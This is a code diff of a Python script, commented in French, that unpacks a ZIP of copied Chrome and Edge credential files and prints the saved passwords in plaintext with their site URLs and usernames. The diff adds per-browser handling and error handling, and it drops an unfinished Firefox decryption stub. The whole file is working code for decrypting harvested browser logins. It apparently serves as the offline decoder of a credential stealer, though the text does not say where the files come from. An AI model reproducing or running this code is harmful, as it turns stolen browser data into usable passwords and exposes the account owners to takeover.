@@ -1,10 +1,10 @@
 import base64
-# import json
 import os
 import shutil
 import sqlite3
 import zipfile
-from colorama import Fore, init
+import re
+from colorama import init
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from prettytable import PrettyTable
@@ -21,35 +21,43 @@ def extract_zip(zip_path):
 
 
 def find_files(extracted_folder):
-    login_data_files = []
-    local_state_file = None
-    decrypted_key_file = None
+    login_data_files = {}
+    main_folder = os.path.join(extracted_folder, os.listdir(extracted_folder)[0])
 
-    for root, dirs, files in os.walk(extracted_folder):
-        for file in files:
+    for browser_name in os.listdir(main_folder):
+        if browser_name not in ["google", "edge"]:
+            continue
+        browser_folder = os.path.join(main_folder, browser_name)
+        login_data_files[browser_name] = {
+            "login_data_files": [],
+            "local_state_file": None,
+            "decrypted_key_file": None
+        }
+
+        for file in os.listdir(browser_folder):
+            file_path = os.path.join(browser_folder, file)
+
             if file.startswith("LoginData"):
-                login_data_files.append(os.path.join(root, file))
-            elif file == "LocalState" and local_state_file is None:
-                local_state_file = os.path.join(root, file)
-            elif file == "decrypted_key.txt" and decrypted_key_file is None:
-                decrypted_key_file = os.path.join(root, file)
+                login_data_files[browser_name]["login_data_files"].append(file_path)
+            elif file == "LocalState":
+                login_data_files[browser_name]["local_state_file"] = file_path
+            elif file.lower() == "decrypted_key.txt":  # Correction ici
+                login_data_files[browser_name]["decrypted_key_file"] = file_path
 
-    # Vérification de la présence des fichiers essentiels
-    if not login_data_files or not local_state_file or not decrypted_key_file:
-        raise FileNotFoundError(
-            "Les fichiers LoginData, LocalState ou decrypted_key.txt n'ont pas été trouvés dans le ZIP.")
+        # Vérification des fichiers nécessaires
+        if not login_data_files[browser_name]["login_data_files"] or not login_data_files[browser_name]["local_state_file"] or not login_data_files[browser_name]["decrypted_key_file"]:
+            raise FileNotFoundError(
+                f"Les fichiers LoginData, LocalState ou decrypted_key.txt sont manquants dans le dossier {browser_name}."
+            )
 
-    return login_data_files, local_state_file, decrypted_key_file
+    return login_data_files
 
 
-def decrypt_key(zip_extracted_folder):
+def decrypt_key(decrypted_key_path):
+    if not os.path.exists(decrypted_key_path):
+        raise FileNotFoundError("Le fichier Decrypted_Key est introuvable.")
 
-    # Vérifier que le fichier contenant la clé existe
-    if not os.path.exists(zip_extracted_folder):
-        raise FileNotFoundError("Le fichier decrypted_key.txt n'a pas été trouvé dans le dossier extrait.")
-
-    # Lire la clé en base64 depuis le fichier et la décoder en binaire
-    with open(zip_extracted_folder, "r", encoding="utf-8") as f:
+    with open(decrypted_key_path, "r", encoding="utf-8") as f:
         decrypted_key_base64 = f.read().strip()
     decrypted_key = base64.b64decode(decrypted_key_base64)
 
@@ -57,21 +65,27 @@ def decrypt_key(zip_extracted_folder):
 
 
 def decrypt_password(encrypted_password, key):
-    iv = encrypted_password[3:15]
-    tag = encrypted_password[-16:]
-    encrypted_password = encrypted_password[15:-16]
-    cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
-    decryptor = cipher.decryptor()
-    decrypted_password = decryptor.update(encrypted_password) + decryptor.finalize()
-    return decrypted_password
+    try:
+        iv = encrypted_password[3:15]
+        tag = encrypted_password[-16:]
+        encrypted_password = encrypted_password[15:-16]
+
+        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
+        decryptor = cipher.decryptor()
+        decrypted_password = decryptor.update(encrypted_password) + decryptor.finalize()
+        return decrypted_password.decode('utf-8', errors='ignore')
+    except Exception as e:
+        raise ValueError(f"Erreur lors du déchiffrement : {str(e)}")
 
 
-def get_passwords(login_data, key, browser="Google Chrome", profile="Default"):
+def clean_text(text):
+    # Remplace les caractères non imprimables par un espace
+    return re.sub(r'[\x00-\x1F\x7F-\x9F]', ' ', text)
+
+
+def get_passwords(login_data, key, browser="Unknown Browser", profile="Default"):
     shutil.copy2(login_data, "login_data.db")
     conn = sqlite3.connect("login_data.db")
-    cursor = conn.cursor()
-    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-
     table = PrettyTable()
     table.field_names = ["Status", "Browser", "Profile", "URL", "Username", "Decrypted Password", "Error"]
 
@@ -79,60 +93,63 @@ def get_passwords(login_data, key, browser="Google Chrome", profile="Default"):
     if profile == "Profile 0":
         profile = "Default"
 
-    for url, username, encrypted_password in cursor.fetchall():
-        if encrypted_password:
-            try:
-                decrypted_password = decrypt_password(encrypted_password, key)
-                status = "V"
-                table.add_row([status, browser, profile, url, username, decrypted_password.decode('utf-8', errors='ignore'), ""])
-            except Exception as e:
-                status = "X"
-                error_message = str(e)
-                table.add_row([Fore.YELLOW + status, Fore.YELLOW + browser, Fore.YELLOW + profile, Fore.YELLOW + url, Fore.YELLOW + username, "", Fore.YELLOW + error_message])
+    try:
+        cursor = conn.cursor()
+        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
 
-    conn.close()
+        for url, username, encrypted_password in cursor.fetchall():
+            if encrypted_password:
+                try:
+                    decrypted_password = decrypt_password(encrypted_password, key)
+                    # Nettoyage des valeurs avant de les ajouter à la table
+                    table.add_row([
+                        clean_text("V"),
+                        clean_text(browser),
+                        clean_text(profile),
+                        clean_text(url),
+                        clean_text(username),
+                        clean_text(decrypted_password),
+                        clean_text("")
+                    ])
+                except ValueError as e:
+                    table.add_row([
+                        clean_text("X"),
+                        clean_text(browser),
+                        clean_text(profile),
+                        clean_text(url),
+                        clean_text(username),
+                        clean_text(""),
+                        clean_text(str(e))
+                    ])
+
+    finally:
+        conn.close()
+
     os.remove("login_data.db")
     return table
 
 
 def decrypt_passwords(zip_path):
     extracted_folder = extract_zip(zip_path)
-    login_data_files, local_state, decrypt_key_path = find_files(extracted_folder)
-    key = decrypt_key(decrypt_key_path)
+    browser_files = find_files(extracted_folder)
 
     final_table = PrettyTable()
     final_table.field_names = ["Status", "Browser", "Profile", "URL", "Username", "Decrypted Password", "Error"]
 
-    for login_data in login_data_files:
-        # Utiliser le nom du fichier pour le profil
-        profile_name = os.path.basename(login_data)
-        passwords_table = get_passwords(login_data, key, profile=profile_name)
-        final_table.add_rows(passwords_table.rows)
+    for browser, files in browser_files.items():
+        key = decrypt_key(files["decrypted_key_file"])
+        for login_data in files["login_data_files"]:
+            profile_name = os.path.basename(login_data)
+            passwords_table = get_passwords(login_data, key, browser=browser, profile=profile_name)
+            final_table.add_rows(passwords_table.rows)
 
+    shutil.rmtree(extracted_folder)  # Supprimer les fichiers extraits après traitement
     return final_table
-
-
-# decrypt firefox passwords
-# j'ai 2 fichiers logins.json et key4.db
-# logins.json contient les mots de passe chiffrés
-# key4.db contient la clé de chiffrement
-# pour déchiffrer les mots de passe, j'ai besoin de la clé de chiffrement
-# pour obtenir la clé de chiffrement, j'ai besoin de la clé maître
-'''
-def extract_firefox_key(master_key, key_db_path):
-
-
-def decrypt_firefox_passwords(zip_path):
-
-
-def 
-
-'''
 
 
 def main():
     try:
-        zip_path = "test.zip"
+        zip_path = "test.zip"  # Peut être rendu paramétrable
         passwords_table = decrypt_passwords(zip_path)
         print(passwords_table)
     except Exception as e:
